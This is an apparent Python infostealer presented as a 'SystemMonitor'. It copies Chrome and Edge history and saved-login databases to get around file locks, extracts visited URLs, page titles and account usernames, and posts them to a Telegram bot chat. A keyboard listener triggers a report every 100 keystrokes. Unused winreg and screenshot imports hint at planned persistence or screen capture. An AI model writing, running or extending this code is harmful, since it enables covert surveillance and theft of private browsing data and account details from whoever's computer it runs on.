import os
import winreg
import sqlite3
import tempfile
from pathlib import Path
from pynput import keyboard
from PIL import ImageGrab
import requests
from threading import Thread, Lock
import logging
import shutil

# ========== Configuration ========== #
TELEGRAM_API_TOKEN = "API bot"
TELEGRAM_CHAT_ID = "Account ID"
KEYSTROKE_LIMIT = 100
BROWSER_PATHS = {
    'Chrome': {
        'history': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History'),
        'logins': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
    },
    'Edge': {
        'history': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History'),
        'logins': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
    }
}
# ================================== #

logging.basicConfig(
    filename='myapp.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

class TelegramBot:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/"
        
    def send_message(self, text):
        try:
            url = f"{self.base_url}sendMessage"
            params = {'chat_id': TELEGRAM_CHAT_ID, 'text': text}
            requests.post(url, params=params)
        except Exception as e:
            logging.error(f"Telegram error: {str(e)}")

class SystemMonitor:
    def __init__(self):
        self.keystroke_count = 0
        self.lock = Lock()
        self.bot = TelegramBot()

    def get_browser_data(self):
        report = []
        for browser, paths in BROWSER_PATHS.items():
            try:
                # Copying files to bypass browser blocking
                with tempfile.TemporaryDirectory() as temp_dir:
                    #Story
                    if os.path.exists(paths['history']):
                        history_copy = os.path.join(temp_dir, 'History')
                        shutil.copy2(paths['history'], history_copy)
                        report.append(self.read_history_db(history_copy, browser))
                    
                    # Login's
                    if os.path.exists(paths['logins']):
                        logins_copy = os.path.join(temp_dir, 'Logins')
                        shutil.copy2(paths['logins'], logins_copy)
                        report.append(self.read_logins_db(logins_copy, browser))
                        
            except Exception as e:
                logging.error(f"{browser} error: {str(e)}")
        
        return '\n'.join(report) if report else "No data found"

    def read_history_db(self, db_path, browser):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls LIMIT 50")
            history = "\n".join([f"[{browser}] {url} - {title}" for url, title in cursor.fetchall()])
            conn.close()
            return f"\n{history}"
        except Exception as e:
            logging.error(f"History error: {str(e)}")
            return ""

    def read_logins_db(self, db_path, browser):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            logins = []
            for url, user, _ in cursor.fetchall():
                logins.append(f"[{browser}] {url} - User: {user}")
            conn.close()
            return "\n".join(logins)
        except Exception as e:
            logging.error(f"Logins error: {str(e)}")
            return ""

    def on_press(self, key):
        with self.lock:
            self.keystroke_count += 1
            if self.keystroke_count >= KEYSTROKE_LIMIT:
                Thread(target=self.send_report).start()
                self.keystroke_count = 0

    def send_report(self):
        try:
            report = self.get_browser_data()
            if report:
                self.bot.send_message(f"Browser Data Report:\n{report}")
        except Exception as e:
            logging.error(f"Report error: {str(e)}")
